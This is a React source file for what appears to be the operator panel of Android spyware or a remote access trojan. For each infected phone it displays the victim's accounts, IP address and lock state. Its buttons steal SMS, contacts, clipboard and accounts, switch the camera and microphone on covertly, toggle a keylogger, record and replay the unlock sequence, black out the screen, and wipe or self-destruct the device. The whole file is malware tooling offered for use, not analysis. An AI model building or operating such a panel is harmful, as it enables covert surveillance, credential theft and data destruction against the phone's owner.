import { useState } from 'react';
import { api } from '../../lib/api';
import { Card, Btn, CmdBtn, C } from './shared';

function Row({ label, value }) {
  return (
    <div style={{ display: 'flex', padding: '5px 0', borderBottom: `1px solid #0d0d12`, fontSize: 12 }}>
      <span style={{ width: 160, color: C.dim, flexShrink: 0 }}>{label}</span>
      <span style={{ color: C.text, wordBreak: 'break-all' }}>{value ?? '—'}</span>
    </div>
  );
}

export default function InfoTab({ device }) {
  const [alias, setAlias] = useState(device.alias || '');
  const [saving, setSaving] = useState(false);

  async function save() {
    setSaving(true);
    await api.renameDevice(device.id, alias).catch(() => {});
    setSaving(false);
  }

  const id = device.id;

  return (
    <div>
      <Card title="Device Info">
        <Row label="Device ID"            value={id} />
        <Row label="Model"                value={`${device.manufacturer || ''} ${device.model || ''}`.trim()} />
        <Row label="Android"              value={`${device.android_version || '?'} (SDK ${device.sdk || '?'})`} />
        <Row label="Battery"              value={device.battery_level >= 0 ? `${device.battery_level}% ${device.is_charging ? '⚡ Charging' : ''}` : null} />
        <Row label="Admin Active"         value={device.admin_active ? '✓ Yes' : '✗ No'} />
        <Row label="Accessibility"        value={device.accessibility_active ? '✓ Active' : '✗ Inactive'} />
        <Row label="Google Accounts"      value={Array.isArray(device.accounts) ? device.accounts.join(', ') : (device.accounts || null)} />
        <Row label="IP Address"           value={device.ip_address} />
        <Row label="Status"               value={device.online ? '🟢 Online' : '⚫ Offline'} />
        <Row label="Current App"          value={device.current_app || null} />
        <Row label="Screen On"            value={device.is_screen_on ? 'Yes' : 'No'} />
        <Row label="Locked"               value={device.is_locked ? 'Yes' : 'No'} />
        <Row label="Last Seen"            value={device.last_seen ? new Date(device.last_seen).toLocaleString() : null} />
        <Row label="First Seen"           value={device.created_at ? new Date(device.created_at).toLocaleDateString() : null} />
      </Card>

      <Card title="Alias">
        <div style={{ display: 'flex', gap: 8 }}>
          <input value={alias} onChange={e => setAlias(e.target.value)} placeholder="Friendly name..."
            style={{ flex: 1, padding: '8px 11px', background: C.bg, border: `1px solid ${C.border}`, borderRadius: 5, color: C.text, fontSize: 13, outline: 'none' }} />
          <Btn label={saving ? '…' : 'Save'} onClick={save} variant="primary" disabled={saving} />
        </div>
      </Card>

      <Card title="Data Collection">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="GET_DEVICE_INFO"   label="📋 Device Info" />
          <CmdBtn deviceId={id} action="GET_LOCATION"      label="📍 Location" />
          <CmdBtn deviceId={id} action="GET_SMS"           label="✉ SMS" />
          <CmdBtn deviceId={id} action="GET_CONTACTS"      label="👤 Contacts" />
          <CmdBtn deviceId={id} action="GET_INSTALLED_APPS"label="📦 Apps" />
          <CmdBtn deviceId={id} action="GET_CLIPBOARD"     label="📋 Clipboard" />
          <CmdBtn deviceId={id} action="GET_ACCOUNTS"      label="🔑 Accounts" />
          <CmdBtn deviceId={id} action="STEALTH_STATUS"    label="🛡 Stealth" />
          <CmdBtn deviceId={id} action="CHECK_ADMIN_STATUS"label="👑 Admin Check" />
        </div>
      </Card>

      <Card title="Camera / Mic">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="TOGGLE_CAMERA"    params={{ enabled: true }}  label="📷 Cam ON"  />
          <CmdBtn deviceId={id} action="TOGGLE_CAMERA"    params={{ enabled: false }} label="📷 Cam OFF" />
          <CmdBtn deviceId={id} action="SWITCH_CAMERA"    label="↔ Switch Cam" />
          <CmdBtn deviceId={id} action="TOGGLE_MICROPHONE" params={{ enabled: true }}  label="🎙 Mic ON" />
          <CmdBtn deviceId={id} action="TOGGLE_MICROPHONE" params={{ enabled: false }} label="🎙 Mic OFF" />
          <CmdBtn deviceId={id} action="SNAP_SCREEN"      label="📸 Screenshot" />
        </div>
      </Card>

      <Card title="Screen Controls">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="BLACK_SCREEN_ON"    label="⬛ Black ON" />
          <CmdBtn deviceId={id} action="BLACK_SCREEN_OFF"   label="⬜ Black OFF" />
          <CmdBtn deviceId={id} action="LOCK_DEVICE"        label="🔒 Lock" />
          <CmdBtn deviceId={id} action="SCREEN_PERSISTENCE" label="📺 Persist" />
          <CmdBtn deviceId={id} action="TOGGLE_KILLER_MODE" label="💀 Killer" variant="danger" />
        </div>
      </Card>

      <Card title="Accessibility / Unlock">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="TOGGLE_KEYLOGGER"    params={{ enabled: true }}  label="⌨ Keylog ON" />
          <CmdBtn deviceId={id} action="TOGGLE_KEYLOGGER"    params={{ enabled: false }} label="⌨ Keylog OFF" />
          <CmdBtn deviceId={id} action="TOGGLE_SCREEN_READER" params={{ enabled: true }}  label="👁 Reader ON" />
          <CmdBtn deviceId={id} action="TOGGLE_SCREEN_READER" params={{ enabled: false }} label="👁 Reader OFF" />
          <CmdBtn deviceId={id} action="START_UNLOCK_RECORDING" label="🎥 Record Unlock" />
          <CmdBtn deviceId={id} action="STOP_UNLOCK_RECORDING"  label="⏹ Stop Record" />
          <CmdBtn deviceId={id} action="PLAY_UNLOCK_SEQUENCE"   label="▶ Replay Unlock" />
          <CmdBtn deviceId={id} action="REQUEST_ADMIN_PERMISSION" label="👑 Request Admin" />
          <CmdBtn deviceId={id} action="CONFIGURE_ROM"           label="🔧 Config ROM" />
        </div>
      </Card>

      <Card title="System">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="PING"                 label="🏓 Ping" />
          <CmdBtn deviceId={id} action="RECONNECT_CONNECTION" label="🔄 Reconnect" />
          <CmdBtn deviceId={id} action="FORCE_RESTART_VNC"    label="🔁 Restart VNC" />
          <CmdBtn deviceId={id} action="SET_THREAT_LEVEL"     params={{ level: 0 }}  label="🛡 Threat 0" />
          <CmdBtn deviceId={id} action="SET_THREAT_LEVEL"     params={{ level: 90 }} label="🛡 Threat 90" />
          <CmdBtn deviceId={id} action="LIST_PLUGINS"         label="🔌 Plugins" />
        </div>
      </Card>

      <Card title="⚠ Danger Zone">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          <CmdBtn deviceId={id} action="FORMAT_DEVICE"  label="🗑 Wipe Device"    variant="danger" />
          <CmdBtn deviceId={id} action="SELF_DESTRUCT"  label="💣 Self Destruct"  variant="danger" />
          <CmdBtn deviceId={id} action="UNINSTALL"      label="🚮 Uninstall Self" variant="danger" />
        </div>
      </Card>
    </div>
  );
}
